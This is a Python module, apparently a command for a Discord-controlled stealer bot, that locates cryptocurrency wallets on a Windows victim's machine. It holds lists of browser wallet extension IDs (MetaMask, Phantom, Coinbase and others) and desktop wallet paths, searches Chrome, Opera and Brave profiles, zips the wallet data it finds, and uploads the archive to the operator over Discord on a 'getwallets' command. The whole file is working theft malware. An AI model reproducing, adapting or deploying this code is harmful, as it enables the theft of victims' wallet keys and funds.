#<imports>
import os
import zipfile
import tempfile
#</imports>



wallets_ext_names = {
    "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
    "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
    "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
    "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
    "Coin98": "aeachknmefphepccionboohckonoeemg",
    "KardiaChain": "pdadjkfkgcafgbceimcpbkalnfnepbnk",
    "TerraStation": "aiifbnbfobpmeekipheeijimdpnlpgpp",
    "Wombat": "amkmjjmmflddogmhpjloimipbofnfjih",
    "Harmony": "fnnegphlobjdpkhecapkijjdkgcjhkib",
    "Nami": "lpfcbjknijpeeillifnkikgncikgfhdo",
    "MartianAptos": "efbglgofoippbgcjepnhiblaibcnclgk",
    "Braavos": "jnlgamecbpmbajjfhmmmlhejkemejdma",
    "XDEFI": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
    "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
    "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
    "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
    "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
    "Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
}


wallet_local_paths = {
    "Bitcoin": "C:/Users/{}/AppData/Roaming/Bitcoin/wallets",
    "Zcash": "C:/Users/{}/AppData/Roaming/Zcash",
    "Armory": "C:/Users/{}/AppData/Roaming/Armory",
    "Bytecoin": "C:/Users/{}/AppData/Roaming/bytecoin",
    "Jaxx": "C:/Users/{}/AppData/Roaming/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",
    "Exodus": "C:/Users/{}/AppData/Roaming/Exodus/exodus.wallet",
    "Ethereum": "C:/Users/{}/AppData/Roaming/Ethereum/keystore",
    "Electrum": "C:/Users/{}/AppData/Roaming/Electrum/wallets",
    "AtomicWallet": "C:/Users/{}/AppData/Roaming/atomic/Local Storage/leveldb",
    "Guarda": "C:/Users/{}/AppData/Roaming/Guarda/Local Storage/leveldb",
    "Coinomi": "C:/Users/{}/AppData/Roaming/Coinomi/Coinomi/wallets",
}


def get_wallet_paths():
    wallet_paths_list = []


    current_user = os.getlogin()

    profiles_full_path = [
        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default"),
        os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Programs", "Opera GX", "User Data", "Default"),
        os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
    ]

    # Check extension wallets
    for path in profiles_full_path:
        ext_path = os.path.join(path, "Local Extension Settings")
        if os.path.exists(ext_path):
            for wallet_name, wallet_id in wallets_ext_names.items():
                wallet_path = os.path.join(ext_path, wallet_id)
                if os.path.isdir(wallet_path):
                    wallet_paths_list.append(wallet_path)

    # Check local wallet paths
    for wallet_name, wallet_path in wallet_local_paths.items():
        local_path = wallet_path.format(current_user)
        if os.path.exists(local_path):
            wallet_paths_list.append(local_path)

    return wallet_paths_list



#<command>
@bot.command(name="getwallets")
async def get_wallets(ctx):
    wallet_paths = get_wallet_paths()

    if wallet_paths:

        with tempfile.TemporaryDirectory() as temp_dir:

            zip_file_path = os.path.join(temp_dir, "wallets.zip")

            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for wallet_path in wallet_paths:
                    if os.path.isdir(wallet_path):
                        for root, dirs, files in os.walk(wallet_path):
                            for file in files:
                                file_path = os.path.join(root, file)
                                zipf.write(file_path, os.path.relpath(file_path, wallet_path))


            await ctx.send("Wallets found and zipped! Here's your file:", file=discord.File(zip_file_path))

    else:
        await ctx.send("No wallets found.")
#</command>


